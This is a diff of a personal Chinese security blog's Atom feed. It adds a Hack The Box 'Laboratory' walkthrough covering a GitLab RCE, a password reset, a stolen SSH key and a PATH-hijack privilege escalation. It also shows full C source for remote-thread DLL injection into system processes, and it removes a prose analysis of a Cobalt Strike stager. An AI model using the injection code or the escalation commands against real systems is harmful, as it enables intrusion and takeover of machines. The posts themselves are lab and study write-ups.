@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-03-14T16:07:06.604Z</updated>
+  <updated>2021-03-18T05:37:14.549Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,35 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>HTB laboratory</title>
+    <link href="http://422926799.github.io/posts/2ee11a81.html"/>
+    <id>http://422926799.github.io/posts/2ee11a81.html</id>
+    <published>2021-03-18T05:29:21.000Z</published>
+    <updated>2021-03-18T05:37:14.549Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre><code>nmap -sC -sV 10.10.10.216</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p><p>从扫描结果能看到，有两个域</p><pre><code>laboratory.htbgit.laboratory.htb</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p><p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p><p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p><p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p><p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p><p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p><p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p><p><img src="img/user.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p><pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmodchmod 777 /tmp/chmodexport PATH=/tmp:$PATH</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;常规nmap扫描&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -sC -sV 10.10.10.216
+&lt;/code&gt;&lt;/pre</summary>
+      
+    
+    
+    
+    
+    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
+    
+  </entry>
+  
+  <entry>
     <title>远程线程注入(系统进程)</title>
     <link href="http://422926799.github.io/posts/b76f927c.html"/>
     <id>http://422926799.github.io/posts/b76f927c.html</id>
     <published>2021-03-14T15:57:27.000Z</published>
-    <updated>2021-03-14T16:07:06.604Z</updated>
+    <updated>2021-03-14T16:07:12.399Z</updated>
     
     <content type="html"><![CDATA[<p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>CreateRemoteThread</li></ul><p>特权开启：</p><ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p><pre><code class="C">bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}</code></pre><p>完整代码</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}int main(){        int pid = 1148;        EnbalePrivileges();        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;        int dllnamesize = strlen(dllname) * 2;        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);        if (pidmodule == NULL) {               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);        if (vaeAddr == NULL) {               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);        if (loadaddress == NULL) {               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);        if (runthread == NULL) {               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());        }        printf(&quot;CreateRemoteThread Sucess\n&quot;);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>]]></content>
     
@@ -443,29 +467,6 @@
     
     
     <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>cs 4.0马子分析模仿</title>
-    <link href="http://422926799.github.io/posts/b4f959ad.html"/>
-    <id>http://422926799.github.io/posts/b4f959ad.html</id>
-    <published>2020-12-26T11:03:27.000Z</published>
-    <updated>2020-12-26T11:55:29.567Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下<br>由于技术不行，复现的并不完整。纯属记录</p><p>原文链接：<a href="https://www.52pojie.cn/thread-1334525-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1334525-1-1.html</a></p><h2 id="测试描述"><a href="#测试描述" class="headerlink" title="测试描述"></a>测试描述</h2><p>cs version:4.1<br>分段式exe</p><h2 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h2><p>IDA 7.5<br>x64dbg</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>Exeinfo查看对应的信息<br><img src="https://s3.ax1x.com/2020/12/26/r4EwPx.png" alt=""></p><p>无ASLR拖动到IDA分析,可寻找到入口点<br>(主要流程是执行两个函数然后开始循环sleep，默认是等待1秒)<br><img src="https://s3.ax1x.com/2020/12/26/r4VVW6.png" alt=""></p><p>根据原文章主要点在sub_401795，而sub_402A60尝试着去分析。后面并无得出啥结论<br>sub_401795<br><img src="https://s3.ax1x.com/2020/12/26/r4V5kR.png" alt=""></p><p>主要过程</p><ul><li>获取时间戳除以0x26AA</li><li>拼接得到pipe（管道）</li><li>创建进程执行sub_401685函数</li><li>返回sub_401742函数执行结果</li></ul><p>sub_401685函数<br><img src="https://s3.ax1x.com/2020/12/26/r4VztI.png" alt=""></p><p>继续跟踪里面的sub_4015D0</p><ul><li>创建管道</li><li>链接对应的管道</li><li>向管道写入shellcode</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4ZyEd.png" alt=""></li></ul><p>sub_401742函数</p><ul><li>malloc分配对应的内存空间</li><li>延时0x400秒</li><li>执行sub_4016A2函数</li><li>循环结束后执行sub_40152E函数<br><img src="https://s3.ax1x.com/2020/12/26/r4Z4KS.png" alt=""></li></ul><p>sub_4016A2函数</p><ul><li>创建管道</li><li>读取管道里的内容</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4epVJ.png" alt=""></li></ul><p>sub_40152E函数</p><ul><li>申请0x3000大小的内存空间</li><li>执行sub_4014F3函数判断是采用GetModuleHandleA还是GetProcAddress函数</li><li>执行VirtualProtect函数修改内存属性</li><li>CreateThread执行shellcode<br>sub_4014F3函数<br><img src="https://s3.ax1x.com/2020/12/26/r4eoQK.png" alt=""></li></ul><p><img src="https://s3.ax1x.com/2020/12/26/r4eKIA.png" alt=""></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>x64dbg打开，用IDA查看入口点函数的地址。x64dbg跳转到对应的地址<br><img src="https://s3.ax1x.com/2020/12/26/r4mVWq.png" alt=""></p><p>对照IDA单步跟踪下去找到写入管道<br><img src="https://s3.ax1x.com/2020/12/26/r4m3k9.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mmlV.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mMmF.png" alt=""></p><p>读取管道并申请内存最后执行shellcode</p><ul><li>加载wininet.dll</li><li>再调用函数InternetOpen函数创建一个HINTERNET根句柄<br><img src="https://s3.ax1x.com/2020/12/26/r4m8YR.png" alt=""></li></ul><p>创建请求句柄，并把数据发送到服务器<br>随后解除数据向cs server发送请求<br><img src="https://s3.ax1x.com/2020/12/26/r4mN6K.png" alt=""></p><p>申请0x400000大小的内存，然后跳转执行到所申请的内存<br><img src="https://s3.ax1x.com/2020/12/26/r4mWnS.png" alt=""></p><p>然后原文那里解密出一个DLL并反射注入，并没模仿成功= =</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下&lt;br&gt;由于技术不行，复现的并不完整。纯属记录&lt;/p&gt;
-&lt;p</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
     
   </entry>
   
